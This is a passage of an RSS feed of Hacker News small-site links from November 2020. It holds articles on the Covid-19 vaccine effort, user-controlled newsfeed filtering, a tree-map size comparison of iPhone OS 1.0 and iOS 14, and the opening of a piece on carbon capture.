data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/d41b8392-4e99-4f38-b23f-90ad643a78dc_1600x1215.png&quot;,&quot;height&quot;:1106,&quot;width&quot;:1456,&quot;resizeWidth&quot;:414,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null}" alt=""></a></figure></div><p>The race for a Covid-19 vaccine is proof that we can overcome difficult challenges. <em>EV</em> reader, Geraint Rees, <a href="https://twitter.com/profgeraintrees/status/1330782816360083457">pointed out that it’s</a> “worth recognising that this represents a partnership between large and small pharma, universities and the NHS [Britain’s universal health service] plus the use of advance purchase contracts. A public-private ecosystem we would do well to nurture when tackling complex difficult problems of global significance.”</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F47072dd7-cacb-4d26-a42b-dcefb3c7436b_1208x690.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F47072dd7-cacb-4d26-a42b-dcefb3c7436b_1208x690.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/47072dd7-cacb-4d26-a42b-dcefb3c7436b_1208x690.png&quot;,&quot;height&quot;:690,&quot;width&quot;:1208,&quot;resizeWidth&quot;:396,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null}" alt=""></a></figure></div><p>The vaccine is more than just a little bit of science. It is groundbreaking science and a complex coordination problem. And yes the pandemic has shocked us into delivering against that messy interconnected challenge. </p><p>The pandemic, for better or worse, accelerated experimentation in the exponential transition (think lower carbon emissions, more local living, remote collaboration, telehealth, widespread PCR testing, remote deliveries). At a time of rising populism worldwide, rampant conspiracy theories and economic precariousness, the fight against Covid-19 has reminded many of the collective public good and social safety nets. Without <a href="https://www.fiercepharma.com/pharma/after-nearly-1b-research-funding-moderna-takes-1-5b-coronavirus-vaccine-order-from-u-s">substantial government backing</a>, these vaccines wouldn’t have been developed so rapidly. There have been some serious bumps along the way (especially in the United States), but the direction of accomplishment is clear.&nbsp;</p><p><a href="https://observer.com/2020/11/covid19-vaccine-price-pfizer-moderna-astrazeneca-oxford/">And it will be cheap</a>. In the US, the Moderna vaccine will run from $10-50 per dose; Pfizer $20 per dose; and Astra Zeneca $4 per dose. In emerging markets, AZ will ship the vaccines at $3 per dose, assuming 2 doses. The two billion doses the firm plans to make for emerging markets in 2021 will run to about $6bn. This is a pittance in the scale of the global economy. (Or consider that the US government handed the airline industry, a sector chock full of <a href="https://www.bloomberg.com/news/articles/2020-03-16/u-s-airlines-spent-96-of-free-cash-flow-on-buybacks-chart?sref=U0wOqcqE">share-buyback addicts like United</a>, $25bn in April <a href="https://www.nytimes.com/2020/04/14/business/coronavirus-airlines-bailout-treasury-department.html#:~:text=the%20main%20story-,Crippled%20Airline%20Industry%20to%20Get%20%2425%20Billion,Part%20of%20It%20as%20Loans&amp;text=WASHINGTON%20%E2%80%94%20The%20Trump%20administration%20has,hobbled%20by%20the%20coronavirus%20pandemic.">this year</a>.)</p><h3><strong>The power of necessity</strong></h3><p>What would happen if we harnessed this pandemic mindset and applied it to other less visible pandemic-scale problems on our doorstep?&nbsp;</p><p>What of climate change? What of women’s rights? Or global poverty? Or unemployed youth? Or climate-based migration? Or water security?&nbsp; Consider the problem of <a href="https://www.statista.com/chart/23545/share-of-the-population-practicing-or-exposed-to-open-defecation/#:~:text=Progress%20to%20that%20end%20has,to%209%20percent%20in%202017)">open defecation</a>, which threatens sanitation levels and causes significant health issues around the world. More than 4bn people around the world--more than the user base of Facebook--do not have access to working, sanitary toilets. Solving this seemingly straightforward challenge requires complex coordination and, you guessed it, urgency.&nbsp;</p><p>This isn’t to underplay the fissures that Covid-19 has revealed, far from it. When the dust settles on this virus, and some form of population immunity aided by vaccines takes hold, many countries will need to seriously reflect on the lessons of Covid-19. But we can’t let that reality overshadow the work that’s been achieved in public health by scientists, governments and health services courtesy of a cocktail of coordination, cooperation and healthy competition.&nbsp;</p><p>That old catchphrase, “another world is possible” seems strangely apt here. At the beginning of 2020, who would have thought we could achieve medical breakthroughs such as the development of these vaccines as quickly or as cheaply as we have. </p><p>Looking at the planet-wide pandemic-scale problems that define our future, <strong>what will we gain if we embrace the urgency, creativity, constructive competition and collaboration of the pandemic mindset</strong>?&nbsp;</p><p>Cheers,&nbsp;</p><p>Azeem</p><p><strong>Dig deeper:</strong></p><ul><li><p><a href="https://link.chtbl.com/covid-19-impact">The Long-Term Impact of Covid-19: Azeem Azhar in Conversation with Nicholas Christakis</a></p></li><li><p><a href="https://link.chtbl.com/demis-hassabis-ev">DeepMind’s Journey from Games to Fundamental Science: Azeem Azhar in Conversation with Demis Hassabis</a></p></li><li><p>The following podcasts explore the opportunity in synthetic biology:</p><ul><li><p><a href="https://link.chtbl.com/contera-nanotech-ev">The State of Nanotechnology: Azeem Azhar in Conversation with Sonia Contera</a>.</p></li><li><p><a href="https://link.chtbl.com/NswVjjkk">Engineering Biology, the Next Frontier: Azeem Azhar in Conversation with Vijay Pande</a></p></li><li><p><a href="https://link.chtbl.com/trillion-dollar-market">The Next Trillion-Dollar Market: Azeem Azhar in Conversation with Deep Nishar</a></p></li></ul></li></ul></div></div>]]>
            </description>
            <link>https://www.exponentialview.co/p/-what-if-every-day-was-a-pandemic</link>
            <guid isPermaLink="false">hacker-news-small-sites-25196886</guid>
            <pubDate>Tue, 24 Nov 2020 09:46:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Newsfeeds and Information Filters]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25196867">thread link</a>) | @inci90
<br/>
November 24, 2020 | https://thundergolfer.com/newsfeeds/information-retrieval/information-filtering/2019/05/05/newsfeeds-and-information-filters/ | <a href="https://web.archive.org/web/*/https://thundergolfer.com/newsfeeds/information-retrieval/information-filtering/2019/05/05/newsfeeds-and-information-filters/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <div role="main"> <div>   <article> <p><em>A lot</em> of my time nowadays is captured by the newsfeeds on platforms like <a href="https://www.reddit.com/">Reddit</a>,<a href="https://news.ycombinator.com/">Hacker News</a>, and <a href="https://twitter.com/">Twitter</a>. I don’t hate the fact that I’m a bit addicted to their streams, I mostly consume interesting and informative software-centric content, but I have find myself wanting more powerful information filtering tools. <a href="https://en.wikipedia.org/wiki/Information_filtering_system">Information Filtering</a> (IF) as a consumer technology seems to have either fallen out of vogue or never gotten into it, but I’d argue that strong IF tooling is becoming more and more needed by users to ensure their personal happiness and effectiveness. Currently, the world’s information geysers, great aggregators like Facebook, Google, RenRen, and Toutiauo have misaligned incentives with their users. Despite billions in recommender engine research, today’s production recommender systems are still inadequate. Further, the dominance of <em>implicit</em> signals in user profiling have seen the great aggregators serving the <a href="https://waitbutwhy.com/2013/10/why-procrastinators-procrastinate.html"><em>Instant Gratification Monkey</em></a> inside us, or the <a href="https://vignette.wikia.nocookie.net/pixar/images/7/7a/Io_Anger_standard2.jpg/revision/latest/scale-to-width-down/2000?cb=20150425021210"><em>Anger Golem</em></a>. In the absence of these problems, ie. in a system where the great aggregators are ‘perfect information retrievers’, personal IF tooling is not so much needed. But until then, it’s a thing we should begin to consider more seriously.</p> <h3 id="can-i-just-tell-you-what-i-want">Can I just tell you what I want?</h3> <p>If you’re a user of Netflix, Amazon, or Facebook, you know the powers and the weaknesses of an implicit feedback system for user profiling and recommendations. Compared with explicit, implicit has the large advantage of providing the user a super-smooth user experience. No need to tell the system what you’re interested in, it’s busy figuring that out for itself. The clear problem though, the problem that I think necessitates IFs, is many of the things that leak through in implicit feedback we would not at all claim as preferences.</p> <p>I’ll admit, I sometimes click on dumb clickbait. Frustratingly, the machine learning system behind whatever site I’m on will not notice the <em>instant regret</em> I feel having done so, and instead register a positive signal to show more me more articles like “23 times Kloé Kardashian left the house without shoes”. I don’t care about this person, any time I happen to click on anything about them was a moment of brain failure, perhaps at 2am and in a state where I might not be tapping things quite so precisely. Too late though, down the line I’ll be updated when her boyfriend is seen suspicuously grocery shopping with another woman. A woman that’s probably just his sister.</p> <p>From what I’ve come to learn about natural language processing, knowledge graphs, and information filtering generally, it <em>should</em> be more-or-less possible for me to just type in:</p> <blockquote> <p>Do not show me celebrity gossip. I do not care about the Bachelorettes, the Kardashians, or anyone Instagram famous.</p> </blockquote> <p>It <em>should</em> be possible for me to type in:</p> <blockquote> <p>I like sport, particularly Tennis, Soccer, and AFL, but do not show me anything about Cricket</p> </blockquote> <p>Currently Facebook and Google News <em>do</em> have systems that partially have this functionality, though crucially you have to <em>wait</em> for it to show up before you can click a drop down and select “don’t show me stories about X”. I think this is an anti-pattern. The filtering configuration is hidden from me, so I can only fix it through a couple of knobs that only appear once the system has made a mistake. I would <em>really</em> like these filtering configurations to be shareable. If someone discovers/designs a really good way to filter out stuff about horoscopes, they should be able to share it and I should be able to install it into my system. We could even build customisable user profiles to solve the cold-start problem. I’d really like <a href="http://www.tristanharris.com/">Tristan Harris’s</a> filtering configuration, or Noam Chomsky’s.</p> <h3 id="good-recommendation-systems-are-apparently-an-ai-complete-challenge">Good recommendation systems are apparently an AI-complete challenge</h3> <p>Beyond the struggles with the implicit vs. explicit self, for some reason recommender engines struggle immensely with <a href="https://twitter.com/kibblesmith/status/724817086309142529?lang=en">fairly straightforward things</a>. In an age where we’re getting constantly bombarded with useless, irrelevant crap, even if they wanted to our recommender systems couldn’t save us.</p> <p>I get much better recommendations from informed friends and colleagues than I do from any multi-billion dollar recommendation engine. The familiar human beings don’t need to rely on proxy signals for quality like ‘this is getting clicked a lot’, or ‘this contains a lot of words usually found in articles you’ve saved’. They have their own personal human General Intelligence, a wealth of relevant experience in specific areas, and deep understanding of my own experiences and needs. To the extent that recommendation engines succeed right now, I think most of it is driven by a well-curated group of ‘followees’. This is at least the experience I’ve had with Twitter, where much of the content delivered is relevant because I follow almost exclusively AI researchers and prominent software engineers. Francois Chollét still dumps loads of shit into my feed though, and Twitter hasn’t fixed that.</p> <p>So newsfeeds may really need a really solid group of humans to deliver relevant content and filter out rubbish, but looking beyond the current paradigm of recommender systems which optimise for the likelihood of a user clicking on the things it recommends, we can see that good recommendations are an incredibly complex problem. <a href="http://maroo.cs.umass.edu/getpdf.php?id=131">Information Filtering can be reframed as a twist on Information Retrieval (IR)</a>, and under this reframing we can think about a filtering system that blocked content under the kinds of highly complicated criteria embedded in highly complicated search queries.</p> <p>If I ask of an Information Retrieval system (ie. a search engine), “Which distributed graph database best optimises for HTTP request trace storage?”, anything not featured on the first page is essentially <em>filtered</em>. For an example of the IF &lt;-&gt; IR relationship that is more applicable to newsfeeds and online media space, think of the question “How can I engage and act politically in order to safeguard the economic futures of local miners in my community?”. The IF mirror of that is “I don’t want information that hinders my goal of safeguarding the economic futures of local miners in my community”. We recently had a period where people <em>really</em> needed answers to these kinds of questions, and unfortunately their newsfeed technologies failed them.</p> <h3 id="what-have-we-got-to-work-with">What have we got to work with</h3> <p>Wanting to whack together an information filterer myself, I went after existing implementations and research. Information Filtering was a bit of a thing 30 years ago, before even Google, and well before Facebook. Systems like <a href="http://delivery.acm.org.ezproxy.lib.rmit.edu.au/10.1145/30000/22340/p1-malone.pdf?ip=131.170.21.110&amp;id=22340&amp;acc=ACTIVE%20SERVICE&amp;key=65D80644F295BC0D%2E124032AC6F25F239%2E4D4702B0C3E38B35%2E4D4702B0C3E38B35&amp;CFID=826579750&amp;CFTOKEN=62469482&amp;__acm__=1510028698_c214de9c28b7c096c548454bc93d06a2">“The Information Lens”</a>, <a href="https://eric.ed.gov/?id=EJ552498">INFOS</a>, <a href="http://ilpubs.stanford.edu:8090/73/1/1994-7.pdf">SIFT</a>, and NewsClip. Most were concerned with managing and improving the user experience with <a href="https://en.wikipedia.org/wiki/Usenet">UseNet</a>. God knows how they’d deal with today’s content networks, but at least they were trying and at least they seemed to be <em>for the user</em>.</p> <p>As an interesting analogue to problems with today’s platforms that ‘push’ content to the user, similar push-based system existed for research and business use-cases in the 90’s. Even with the use of information-filtering tooling, such systems were found to be <a href="https://books.google.com.au/books?id=g00Gz5nR4s0C&amp;pg=PT329&amp;lpg=PT329&amp;dq=%22BackWeb%22+information+filtering&amp;source=bl&amp;ots=VHxxIRnI5z&amp;sig=_DrzywjFBuUyevvMdbpqnbKB0xM&amp;hl=en&amp;sa=X&amp;ved=0ahUKEwjt2OHIzqvXAhXCJJQKHb2ADWYQ6AEIKjAB#v=onepage&amp;q=%22BackWeb%22%20information%20filtering&amp;f=false"><em>distracting and time-consuming for users</em></a>. The lesson here in that linked passage is so clear it’s like it leaps out of 2003 and smacks you in the face. In professional environment, <em>people recognise the value of employee time</em>, and wasted time is an expense. For social networks, user time is an <em>asset</em>, and wasted time barely makes any sense to them.</p> <p>If I had to speculate, the user experience on internet back in the late 90’s and early 2000’s was such that information filtering tools weren’t required, and now fast-forwarding to 2017 we have a paucity of good software tooling in the problem space. UseNet was created back then, and heaps of tooling around the RSS format, because they addressed the peculiar needs of the time. Then everyone and their nana joined the internet, <a href="https://stratechery.com/2015/aggregation-theory/">Aggregation Theory</a> took hold, and now the internet is a place dominated by great aggregators and ad-revenue incentives.</p> <h3 id="going-forward">Going Forward</h3> <p>For now I think the highest priority in the IF space is fostering an open-source, public community led effort to make user content preferences explicitly defined, compose-able, and shareable.</p> <ul> <li><strong>Explicitly defined:</strong> not ‘I didn’t click on this show don’t show me it’, but ‘filter out anything involving X’.</li> <li><strong>Compose-able:</strong> the characterisation of everything I <em>don’t</em> want show to me is a a complicated thing. The content-based equivalent of a hostfile blacklist won’t cut it.</li> <li><strong>Shareable:</strong> I should be able to share my IF configuration both with other people and with new content providers I want to engage with. Don’t make me select topics I’m interested in or not interested in over and over again.</li> </ul> <p>Those three above would let users take back control of their content feeds from companies whose predominant goal is to cultivate large groups of eyeballs for advertisers.</p> <hr> <p>Thank you for reading. If your interested in further exploration this stuff, <a href="https://www.evernote.com/l/AcRny-ZPqKxPJpAalW7HL95OYqWL1Ld7qvQ">here’s a link to this posts’ notes, with lots of good links</a>.</p> </article>     </div> </div> </div></div>]]>
            </description>
            <link>https://thundergolfer.com/newsfeeds/information-retrieval/information-filtering/2019/05/05/newsfeeds-and-information-filters/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25196867</guid>
            <pubDate>Tue, 24 Nov 2020 09:44:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Comparing iPhone OS 1.0 with iOS 14 using tree maps]]>
            </title>
            <description>
<![CDATA[
Score 197 | Comments 74 (<a href="https://news.ycombinator.com/item?id=25196720">thread link</a>) | @yankcrime
<br/>
November 24, 2020 | https://blog.timac.org/2020/1122-comparing-iphone-os-with-ios-14-using-tree-maps/ | <a href="https://web.archive.org/web/*/https://blog.timac.org/2020/1122-comparing-iphone-os-with-ios-14-using-tree-maps/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>If you followed the recent Apple events, you probably saw a picture of the A14 and M1 dies… that got me thinking about what you would see if you could pass iOS under X-Rays…</p>
<p>In my previous article about the <a href="https://blog.timac.org/2020/1019-evolution-of-the-programming-languages-from-iphone-os-to-ios-14/">evolution of the programming languages from iPhone OS 1.0 to iOS 14</a>, I analyzed iOS based on the number of binaries and their programming languages. As I pointed out in this past post, the size of the binaries were not taken in account. In this new article, I look at iPhone OS 1.0 and iOS 14 from a size perspective using tree maps.</p>

<p>To produce the images in this article, I extracted the root filesystem (including the dyld shared cache) of each major iOS release:</p>
<table>
<thead>
<tr>
<th>Version</th>
<th>Device</th>
</tr>
</thead>
<tbody>
<tr>
<td>iOS&nbsp;14.0 (18A373)</td>
<td>iPhone X</td>
</tr>
<tr>
<td>iOS&nbsp;13.1 (17A844)</td>
<td>iPhone X</td>
</tr>
<tr>
<td>iOS&nbsp;12.0 (16A366)</td>
<td>iPhone X</td>
</tr>
<tr>
<td>iOS&nbsp;11.1 (15B93)</td>
<td>iPhone X</td>
</tr>
<tr>
<td>iOS&nbsp;10.1 (14B72)</td>
<td>iPhone 5s</td>
</tr>
<tr>
<td>iOS&nbsp;9.0 (13A344)</td>
<td>iPhone 5s</td>
</tr>
<tr>
<td>iOS&nbsp;8.0 (12A365)</td>
<td>iPhone 5s</td>
</tr>
<tr>
<td>iOS&nbsp;7.0.1 (11A470a)</td>
<td>iPhone 5s</td>
</tr>
<tr>
<td>iOS&nbsp;6.0 (10A403)</td>
<td>iPhone 3GS</td>
</tr>
<tr>
<td>iOS&nbsp;5.0 (9A334)</td>
<td>iPhone 3GS</td>
</tr>
<tr>
<td>iOS&nbsp;4.0 (8A293)</td>
<td>iPhone 3GS</td>
</tr>
<tr>
<td>iPhone&nbsp;OS&nbsp;3.0 (7A341)</td>
<td>iPhone 3GS</td>
</tr>
<tr>
<td>iPhone&nbsp;OS&nbsp;2.0 (5A347)</td>
<td>iPhone 2G</td>
</tr>
<tr>
<td>iPhone&nbsp;OS&nbsp;1.0 (1A543a)</td>
<td>iPhone 2G</td>
</tr>
</tbody>
</table>
<p>I then created a tree map. You might be familiar with tree maps as they are often used to visualize a file hierarchy to give you a graphical overview of the structure. One key characteristic is that each file is shown as a rectangle with an area proportional to the file's size. The tree maps displayed in this article have been created using the awesome <a href="http://grandperspectiv.sourceforge.net/">GrandPerspective</a> and annotated with <a href="https://www.pixelmator.com/">Pixelmator</a>.</p>

<p>Let's look at what you would see if you could scan iPhone OS 1.0 using X-Rays:</p>
<p><img src="https://blog.timac.org/2020/1122-comparing-iphone-os-with-ios-14-using-tree-maps/images_article/iOS1.png" alt=""></p>
<p>The diagram below highlights some of the major functional blocks:</p>
<p><img src="https://blog.timac.org/2020/1122-comparing-iphone-os-with-ios-14-using-tree-maps/images_article/iOS1_structures.png" alt=""></p>
<p>We can already notice that:</p>
<ul>
<li>The structure is quite simple and has similarities to macOS</li>
<li>Frameworks are taking more than a third of the size</li>
<li>Fonts are taking more than 25% of the whole operating system</li>
</ul>
<p>We can go one level deeper and identify all the components:</p>
<p><img src="https://blog.timac.org/2020/1122-comparing-iphone-os-with-ios-14-using-tree-maps/images_article/iOS1_details.png" alt=""></p>
<p>From the list of components, we can clearly determine all the main features of iPhone OS 1.0:</p>
<ul>
<li>Phone</li>
<li>SMS</li>
<li>Weather</li>
<li>Clock</li>
<li>Mail</li>
<li>Safari + Web</li>
<li>Calendar</li>
<li>Maps</li>
<li>Wallpaper</li>
<li>Ringtones</li>
<li>Office support</li>
<li>Audio player</li>
<li>Video player</li>
<li>…</li>
</ul>
<p>A couple of components worth mentioning:</p>
<ul>
<li>The UIKit framework is taking more than 13 % of the total size</li>
<li>The wallpapers and ringtones count for 6 %</li>
<li>ICU (International Components for Unicode) takes more than 5 %</li>
<li>SpringBoard is roughly 2 %</li>
</ul>

<p>On popular demand, I added this section to provide more info about the fonts.
The huge <code>Fonts</code> block is composed of 2 parts:</p>
<ul>
<li>the fonts representing 2/3 of the size</li>
<li>some caches (visible at the top of the area and representing a third of the size)</li>
</ul>
<p>For the font lovers, here is the complete list of fonts in iPhone OS 1.0:</p>
<pre><code>AmericanTypewriter.ttf
AmericanTypewriterBold.ttf
AmericanTypewriterCondensed.ttf
AmericanTypewriterCondensedBold.ttf
AmericanTypewriterCondensedLight.ttf
AmericanTypewriterLight.ttf
Arial.ttf
ArialBold.ttf
ArialBoldItalic.ttf
ArialItalic.ttf
ArialRoundedMTBold.ttf
arialuni.ttf
CourierBoldOblique.ttf
CourierNew.ttf
CourierNewBold.ttf
CourierNewBoldItalic.ttf
CourierNewItalic.ttf
CourierOblique.ttf
DB_LCD_Temp-Black.ttf
Georgia.ttf
GeorgiaBold.ttf
GeorgiaBoldItalic.ttf
GeorgiaItalic.ttf
Helvetica.ttf
HelveticaBold.ttf
HelveticaBoldOblique.ttf
HelveticaOblique.ttf
LockClock.ttf
MarkerFeltThin.ttf
MarkerFeltWide.ttf
PhonepadTwo.ttf
TimesNewRoman.ttf
TimesNewRomanBold.ttf
TimesNewRomanBoldItalic.ttf
TimesNewRomanItalic.ttf
TrebuchetMS.ttf
TrebuchetMSBold.ttf
TrebuchetMSBoldItalic.ttf
TrebuchetMSItalic.ttf
Verdana.ttf
VerdanaBold.ttf
VerdanaBoldItalic.ttf
VerdanaItalic.ttf
Zapfino.ttf
</code></pre>
<p>The cache contains info for all these fonts and includes the 2 extra files:</p>
<ul>
<li>HelveLTMM.ps</li>
<li>TimesLTMM.ps</li>
</ul>

<p>I won't give details about each iOS release but you can inspect the tree maps from iPhone OS 2.0 to iOS 13.1:</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>iPhone OS 2.0</td>
<td>iPhone OS 3.0</td>
<td>iOS 4.0</td>
</tr>
<tr>
<td><a href="https://blog.timac.org/2020/1122-comparing-iphone-os-with-ios-14-using-tree-maps/images_article/iOS2.png"><img src="https://blog.timac.org/2020/1122-comparing-iphone-os-with-ios-14-using-tree-maps/images_article/iOS2_small.png" alt="" title="iPhone OS 2.0"></a></td>
<td><a href="https://blog.timac.org/2020/1122-comparing-iphone-os-with-ios-14-using-tree-maps/images_article/iOS3.png"><img src="https://blog.timac.org/2020/1122-comparing-iphone-os-with-ios-14-using-tree-maps/images_article/iOS3_small.png" alt="" title="iPhone OS 3.0"></a></td>
<td><a href="https://blog.timac.org/2020/1122-comparing-iphone-os-with-ios-14-using-tree-maps/images_article/iOS4.png"><img src="https://blog.timac.org/2020/1122-comparing-iphone-os-with-ios-14-using-tree-maps/images_article/iOS4_small.png" alt="" title="iOS 4.0"></a></td>
</tr>
<tr>
<td>iOS 5.0</td>
<td>iOS 6.0</td>
<td>iOS 7.0.1</td>
</tr>
<tr>
<td><a href="https://blog.timac.org/2020/1122-comparing-iphone-os-with-ios-14-using-tree-maps/images_article/iOS5.png"><img src="https://blog.timac.org/2020/1122-comparing-iphone-os-with-ios-14-using-tree-maps/images_article/iOS5_small.png" alt="" title="iOS 5.0"></a></td>
<td><a href="https://blog.timac.org/2020/1122-comparing-iphone-os-with-ios-14-using-tree-maps/images_article/iOS6.png"><img src="https://blog.timac.org/2020/1122-comparing-iphone-os-with-ios-14-using-tree-maps/images_article/iOS6_small.png" alt="" title="iOS 6.0"></a></td>
<td><a href="https://blog.timac.org/2020/1122-comparing-iphone-os-with-ios-14-using-tree-maps/images_article/iOS7.png"><img src="https://blog.timac.org/2020/1122-comparing-iphone-os-with-ios-14-using-tree-maps/images_article/iOS7_small.png" alt="" title="iOS 7.0.1"></a></td>
</tr>
<tr>
<td>iOS 8.0</td>
<td>iOS 9.0</td>
<td>iOS 10.1</td>
</tr>
<tr>
<td><a href="https://blog.timac.org/2020/1122-comparing-iphone-os-with-ios-14-using-tree-maps/images_article/iOS8.png"><img src="https://blog.timac.org/2020/1122-comparing-iphone-os-with-ios-14-using-tree-maps/images_article/iOS8_small.png" alt="" title="iOS 8.0"></a></td>
<td><a href="https://blog.timac.org/2020/1122-comparing-iphone-os-with-ios-14-using-tree-maps/images_article/iOS9.png"><img src="https://blog.timac.org/2020/1122-comparing-iphone-os-with-ios-14-using-tree-maps/images_article/iOS9_small.png" alt="" title="iOS 9.0"></a></td>
<td><a href="https://blog.timac.org/2020/1122-comparing-iphone-os-with-ios-14-using-tree-maps/images_article/iOS10.png"><img src="https://blog.timac.org/2020/1122-comparing-iphone-os-with-ios-14-using-tree-maps/images_article/iOS10_small.png" alt="" title="iOS 10.1"></a></td>
</tr>
<tr>
<td>iOS 11.1</td>
<td>iOS 12.0</td>
<td>iOS 13.1</td>
</tr>
<tr>
<td><a href="https://blog.timac.org/2020/1122-comparing-iphone-os-with-ios-14-using-tree-maps/images_article/iOS11.png"><img src="https://blog.timac.org/2020/1122-comparing-iphone-os-with-ios-14-using-tree-maps/images_article/iOS11_small.png" alt="" title="iOS 11.1"></a></td>
<td><a href="https://blog.timac.org/2020/1122-comparing-iphone-os-with-ios-14-using-tree-maps/images_article/iOS12.png"><img src="https://blog.timac.org/2020/1122-comparing-iphone-os-with-ios-14-using-tree-maps/images_article/iOS12_small.png" alt="" title="iOS 12.0"></a></td>
<td><a href="https://blog.timac.org/2020/1122-comparing-iphone-os-with-ios-14-using-tree-maps/images_article/iOS13.png"><img src="https://blog.timac.org/2020/1122-comparing-iphone-os-with-ios-14-using-tree-maps/images_article/iOS13_small.png" alt="" title="iOS 13.1"></a></td>
</tr>
</tbody>
</table>
<p>Note that the number of building blocks increased with each new iOS release and the components are becoming smaller.</p>

<p>We are now in 2020 and iOS 14 is available. Without a surprise, iOS 14 is way more complex than iPhone OS 1.0:</p>
<p><img src="https://blog.timac.org/2020/1122-comparing-iphone-os-with-ios-14-using-tree-maps/images_article/iOS14.png" alt=""></p>
<p>Here is the diagram highlighting the functional blocks in iOS 14:</p>
<p><img src="https://blog.timac.org/2020/1122-comparing-iphone-os-with-ios-14-using-tree-maps/images_article/iOS14_structures.png" alt=""></p>
<p>We can note that the main structure is still fairly similar to the original iPhone OS 1.0 version: the fonts, frameworks, applications, library, /usr, … are still there.</p>
<p>There are however a couple of big differences:</p>
<ul>
<li>iOS 14 contains a lot of <code>Preinstalled Assets</code> and <code>Linguistic Data</code>. As far as I can tell, these components are used for on-device machine learning: language detector, voices, tokenizers, vocalizers, …</li>
<li>The dyld shared cache, a caching mechanism introduced in iPhone OS 3.1, causes the Frameworks and Private Frameworks to be split in several areas. The dyld shared cache has been marked with the red box in the diagram.</li>
<li>Health is clearly an important feature of iOS 14.</li>
</ul>
<p>There are so many components in iOS 14 that it is way more complex to identify all of them. I gave it a try nonetheless:</p>
<p><img src="https://blog.timac.org/2020/1122-comparing-iphone-os-with-ios-14-using-tree-maps/images_article/iOS14_details.png" alt=""></p>
<p>Although it is now difficult to list all the features, there are some clear trends:</p>
<ul>
<li>iOS 14 is packed with on-device machine learning technologies: Face Detection, Deep Convolutional Networks, Vision frameworks, Text Recognition, Neural Network, …</li>
<li>A lot of components are related to the camera and photos: Effects, Memories, video processing, photo library, …</li>
<li>Siri and voices are clearly visible.</li>
<li>As we already mentioned, Health is an important feature.</li>
<li>We can identify a couple of features added over the years: HomeKit, Watch, CarPlay, Spotlight, Emoji 🤟, News, iWork, Wallet, Shortcuts, ARKit, …</li>
</ul>
<p>More statistics:</p>
<ul>
<li>Fonts are now counting for less than 6 % of the size</li>
<li>Linguistic Data represent almost 8 % of the size</li>
<li>Although the ICU size was multiplied by more than 3 since iPhone OS 1.0, it now represents approximatively 0.5% of the total</li>
</ul>

<p>For readability the previous tree maps in this article were all displayed using the same size. If we present iPhone OS 1.0 next to iOS 14 with a proportional area, you would see that the whole iPhone OS 1.0 is basically taking the size of the iOS 14 wallpapers:</p>
<p><img src="https://blog.timac.org/2020/1122-comparing-iphone-os-with-ios-14-using-tree-maps/images_article/Compare-iOS1-iOS14.png" alt=""></p>

<p>When iPhone OS 1.0 was released in 2007, it redefined the smartphone with a limited set of core features. Nowadays iOS 14 contains an incredible amount of components. By looking at them based on their size, we can determine the most important features. We thus distinctly see Apple's AI push into on-device machine learning with technologies like object detection in images and video, language analysis, sound classification and text recognition.</p>

<p><strong>Update 24.11.2020:</strong></p>
<ul>
<li>Added fonts in the iPhone OS 1.0 tree map</li>
<li>Added fonts in the iOS 14 tree map</li>
<li>Add section with fonts info for iPhone OS 1.0</li>
</ul>
</div></div>]]>
            </description>
            <link>https://blog.timac.org/2020/1122-comparing-iphone-os-with-ios-14-using-tree-maps/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25196720</guid>
            <pubDate>Tue, 24 Nov 2020 09:18:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Is carbon capture a viable solution?]]>
            </title>
            <description>
<![CDATA[
Score 106 | Comments 326 (<a href="https://news.ycombinator.com/item?id=25196633">thread link</a>) | @scottbucks
<br/>
November 24, 2020 | https://www.thedetechtor.com/post/carbon-capture-usage-and-storage-the-solution-to-the-climate-crisis | <a href="https://web.archive.org/web/*/https://www.thedetechtor.com/post/carbon-capture-usage-and-storage-the-solution-to-the-climate-crisis">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-hook="post-description"><article><div><div data-rce-version="8.5.0"><div dir="ltr"><div><h3 id="viewer-foo"><span><strong><span>Is this technology a viable solution to beating the climate crisis or <!-- -->can it cause more harm than good?</span></strong></span></h3><p id="viewer-efp47"><span>With the climate crisis continuously getting worse, businesses and governments need to find solutions to reduce the amount of carbon going into the atmosphere. To beat the crisis, the world can't simply rely on renewable energy, governments will need to include carbon capture, usage and storage (CCUS) into the mix if they want to <span>hit their climate targets.</span></span></p><p id="viewer-4uch7"><span>According to the International Energy Agency (IEA), CCUS could <a href="https://www.iea.org/reports/transforming-industry-through-ccus" target="_blank" rel="noopener"><u>reduce carbon emissions by almost a fifth</u></a>, but can this technology deliver on its promises or is it too good to be true?</span></p><h3 id="viewer-5vpth"><span>What is <!-- -->Carbon capture, usage and storage?</span></h3><p id="viewer-pi2c"><span>Carbon capture, usage and storage (CCUS) refers to <!-- -->a chain of different technologies aimed at capturing waste <!-- -->carbon dioxide<!-- --> (<!-- -->CO2<!-- -->), usually from large <!-- -->point sources of pollution like power plants, <!-- 